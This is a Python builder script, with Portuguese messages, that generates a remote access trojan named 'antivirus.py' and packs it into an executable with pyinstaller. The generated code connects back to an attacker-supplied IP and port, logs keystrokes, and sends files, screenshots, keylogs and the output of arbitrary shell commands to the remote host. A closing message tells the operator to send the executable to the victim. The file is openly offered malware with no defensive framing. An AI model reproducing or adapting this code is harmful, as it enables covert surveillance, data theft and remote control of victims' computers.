 
import os 
import sys

SERVER_IP = input("IP do servidor: ") 
PORT = int(input("porta: "))

codigo= f"""
import subprocess
import os
import pyautogui
import threading
from pynput import keyboard
import socket

host = '{SERVER_IP}'
port = {PORT}

s = socket.socket()
s.connect((host,port))
keys = [] 
def on_press(key): 
  try:
       keys.append(str(key.char)) 
  
  except: 
      keys.append(str(key))

if len(keys) >= 10:
    with open("log.txt", "a") as log:
        log.write(''.join(keys) + '')
    keys.clear()
listener = keyboard.Listener(on_press=on_press)
t1 = threading.Thread(target=listener.start) 
t1.daemon = True 
t1.start()



while True:
  try: 
    command = s.recv(1024).decode()

    if command == 'exit':
        break

    elif command.startswith("download"):
      path = command.split(" ", 1)[1]
      if os.path.exists(path):
          with open(path, "rb") as f:
              data = f.read()
              s.sendall(data)
      else:
          s.sendall("Arquivo não encontrado.".encode())

    elif command.startswith("upload"):
      filename = command.split(" ", 1)[1]
      data = s.recv(500000)
      with open(filename, "wb") as f:
          f.write(data)
      s.sendall("Upload concluído.".encode())

    elif command == 'screenshot':
      img = pyautogui.screenshot()
      img.save("screen.png")
      with open("screen.png", "rb") as f:
          s.sendall(f.read())

    elif command == 'keylog':
      if os.path.exists("log.txt"):
          with open("log.txt", "r") as f:
              s.sendall(f.read().encode())
      else:
          s.sendall("Log não encontrado.".encode())

    else:
      output = subprocess.getoutput(command)
      s.sendall(output.encode())
  except:
    s.sendall("[Erro]".encode())
s.close()

"""
code =codigo.encode()

with open("antivirus.py", "wb") as file:
  file.write(code)
  print("malware escrito")

print("[*] Transformando em excutavel")
os.system("pyinstaller --onefile antivirus.py")
print("[Malware] Envia para a victima o executavel em dist")
